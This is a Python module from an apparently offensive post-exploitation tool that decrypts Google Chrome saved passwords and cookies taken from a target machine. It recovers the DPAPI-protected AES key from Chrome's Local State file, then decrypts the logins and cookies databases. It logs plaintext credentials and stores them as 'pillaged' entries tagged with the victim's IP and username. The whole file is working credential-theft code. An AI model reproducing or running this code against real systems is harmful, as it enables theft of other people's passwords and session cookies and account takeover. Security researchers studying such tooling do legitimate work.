import sys
import sqlite3,os,json,base64,binascii
from lib.toolbox import bcolors
from lib.dpapi import *

class CHROME_LOGINS:
	def __init__(self, options,logger,db,username):
		self.logindata_path = None
		self.localstate_path = None
		self.localstate_dpapi = None
		self.cookie_path = None
		self.options = options
		self.logging= logger
		self.username = username
		self.aeskey = None
		self.masterkey = None
		self.masterkey_guid = None
		self.logins = {}
		self.cookies = {}
		self.db=db

	def get_masterkey_guid_from_localstate(self):
		try:
			if self.localstate_path!=None:
				if os.path.isfile(self.localstate_path):
					with open(self.localstate_path, "rb") as f:
						localfile_datas = json.load(f)
						#print(localfile_datas)
						key_blob = localfile_datas['os_crypt']['encrypted_key']
						blob = base64.b64decode(key_blob)
						#print(blob)
						if blob[:5] == b'DPAPI':
							self.logging.debug(f"[{self.options.target_ip}] [Chrome decoding] found DPAPI blob : {binascii.hexlify(blob[5:])}")
							blob = blob[5:]
							self.localstate_dpapi=DPAPI(self.options,self.logging)
							#mydpapi = DPAPI(myoptions, self.logging)
							guid = self.localstate_dpapi.find_Blob_masterkey(raw_data=blob)
							self.logging.debug(f"[{self.options.target_ip}] Looking for masterkey : {guid}")
							if guid != None:
								self.masterkey_guid=guid
								return self.masterkey_guid
						else:
							self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}Erro getting en DPAPI Blob from Chrome localstate file{bcolors.ENDC}")
							return None
		except Exception as ex:
			self.logging.debug(
				f"[{self.options.target_ip}] {bcolors.WARNING}Exception Getting Blob for Chrome{bcolors.ENDC}")
			self.logging.debug(ex)
			return None


	def get_AES_key_from_localstate(self,masterkey=None):
		if self.aeskey!=None:
			return self.aeskey
		if self.masterkey != None:
			key=self.masterkey
		elif masterkey!=None:
			key=masterkey
		else:
			self.logging.debug(	f"[{self.options.target_ip}] {bcolors.WARNING}error in get_AES_key_from_localstate - Masterkey not found {bcolors.ENDC}")
			return None
		self.localstate_dpapi.options.key=key
		self.aeskey=self.localstate_dpapi.decrypt_blob()
		if self.aeskey!= None:
			self.logging.debug(f"[{self.options.target_ip}] [-] Found AES key from localstate - {binascii.hexlify(self.aeskey)} ")
		return self.aeskey

	def decrypt_chrome_password(self,enc_password):
		#BCRYPT
		#BCryptGenerateSymmetricKey(*hAlg==Provider Brypt_GCM, hKey, NULL, 0, key==mykey AES, AES_256_KEY_SIZE, 0);
		#Genere une clef en AES_GCM_256 qui sera utilisé dans l'algo symétrique :
		if self.aeskey == None:
			if self.masterkey!=None:
				#lets get the key
				self.get_AES_key_from_localstate()
			if self.aeskey == None :
				self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Decrypt AES Password - Missing AES key from localstate ? {bcolors.ENDC}")
			return None
		try:
			#Check Chrome password signature KUHL_M_DPAPI_CHROME_UNKV10[] = {'v', '1', '0'};
			if enc_password[:3]==b'v10' or enc_password[:3]==b'v11':
				#key = binascii.unhexlify('8fcd4861a4345013318fd63b2973c4d69c7f2094028f2e12ddcf80acb325f02d')
				#ciphertext = binascii.unhexlify(		'76313018d8448143ced92ff0f5e44c5d5c07edd60ed530e01570e72ce1f7e2c13924c098e569a818f3')
				nonce = enc_password[3:3 + 12]
				iv = nonce  # buff[3:15]
				payload = enc_password[15:]
				#tag = enc_password[-16:]
				cipher = AES.new(self.aeskey, AES.MODE_GCM, iv)
				decrypted_pass = cipher.decrypt(payload)[:-16]#Removing bloc of padded data
				decrypted_pass = decrypted_pass.decode('utf-8')
				if decrypted_pass != None:
					self.logging.debug(f"[{self.options.target_ip}] Decrypted Chrome password : {decrypted_pass}")
					return decrypted_pass
				else:
					self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Error in decrypt Chrome password {bcolors.ENDC}")
					return None
			else :
				self.logging.debug(f"[{self.options.target_ip}] Got a Chrome Version : {enc_password[:3]} NOT IMPLEMENTED")
				#c'est du DPAPI ?
			#Win32CryptUnprotectData(password, is_current_user=constant.is_current_user, user_dpapi=constant.user_dpapi)  user_dpapi=constant.user_dpapi)
		except Exception as ex:
			self.logging.debug(f"[{self.options.target_ip}] {bcolors.WARNING}Exception decrypt_AES_chrome_password Chrome{bcolors.ENDC}")
			self.logging.debug(ex)
			return None



	def decrypt_chrome_LoginData(self):
		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
		try:
			self.logging.debug(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Decrypt LoginData] {bcolors.ENDC} started for {self.logindata_path}")
			if self.logindata_path!=None:
				if os.path.isfile(self.logindata_path):
					connection = sqlite3.connect(self.logindata_path)
					with connection:
						cursor = connection.cursor()
						v = cursor.execute(
							'SELECT action_url, username_value, password_value FROM logins')
						value = v.fetchall()
					self.logging.debug(
						f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Decrypt LoginData] {bcolors.ENDC} got {len(value)} entries")
					for origin_url, username, password in value:
						#self.logging.debug(f"[+] Found Chrome data for user {username} : {origin_url} ")
						self.logins[origin_url]={}
						self.logins[origin_url]['username']=username
						self.logins[origin_url]['enc_password']=password
						self.logins[origin_url]['password']=self.decrypt_chrome_password(password)
						############PROCESSING DATA
						self.db.add_credz(credz_type='browser-chrome',
						                  credz_username=username,
						                  credz_password=self.logins[origin_url]['password'],
						                  credz_target=origin_url,
						                  credz_path='',
						                  pillaged_from_computer_ip=self.options.target_ip,
						                  pillaged_from_username=self.username)
						self.logging.info(	f"[{self.options.target_ip}] [+] {bcolors.OKGREEN} [Chrome Password] {bcolors.ENDC} for {origin_url} [ {bcolors.OKBLUE}{self.logins[origin_url]['username']} : {self.logins[origin_url]['password']}{bcolors.ENDC} ]")
		except sqlite3.OperationalError as e:
			e = str(e)
			if (e == 'database is locked'):
				print('[!] Make sure Google Chrome is not running in the background')
			elif (e == 'no such table: logins'):
				print('[!] Something wrong with the database name')
			elif (e == 'unable to open database file'):
				print('[!] Something wrong with the database path')
			else:
				print(e)
			return None

		return self.logins

	def decrypt_chrome_CookieData(self):
		#path = '192.168.20.141\\Users\\Administrateur.TOUF\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\'
		try:
			if self.cookie_path!=None:
				if os.path.isfile(self.cookie_path):
					connection = sqlite3.connect(self.cookie_path)
					with connection:
						cursor = connection.cursor()
						v = cursor.execute(
							'select host_key, "TRUE", path, "FALSE", expires_utc, name, encrypted_value from cookies')
						values = v.fetchall()

					for host_key, _, path, _, expires_utc, name, encrypted_value in values:
						#self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, {path}, {name},{value},{len(value)}")
						self.cookies[host_key]={}
						self.cookies[host_key][name]=self.decrypt_chrome_password(encrypted_value)
						self.logging.debug(f"[{self.options.target_ip}] [+] Found Chrome cookie for {host_key}, {path}, {name},{self.cookies[host_key][name]}")

		except sqlite3.OperationalError as e:
			e = str(e)
			if (e == 'database is locked'):
				print('[!] Make sure Google Chrome is not running in the background')
			elif (e == 'no such table: logins'):
				print('[!] Something wrong with the database name')
			elif (e == 'unable to open database file'):
				print('[!] Something wrong with the database path')
			else:
				print(e)
			return None

		return self.cookies